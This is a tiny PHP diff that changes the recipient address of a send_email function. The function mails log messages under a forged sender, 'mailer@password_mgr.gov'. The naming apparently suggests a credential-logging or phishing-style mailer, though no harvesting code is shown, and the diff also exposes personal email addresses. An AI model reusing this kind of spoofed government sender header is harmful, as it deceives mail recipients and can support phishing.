@@ -3,7 +3,7 @@
     
     function send_email($title, $log_message)
     {
-    $receiving_email = "nullflex@gmail.com";
+    $receiving_email = "sanjaykdragon@gmail.com";
     $headers = 'From: ' . 'mailer@password_mgr.gov' . "\r\n" .
         'Reply-To: ' . $receiving_email . "\r\n" .
         'X-Mailer: PHP/' . phpversion();
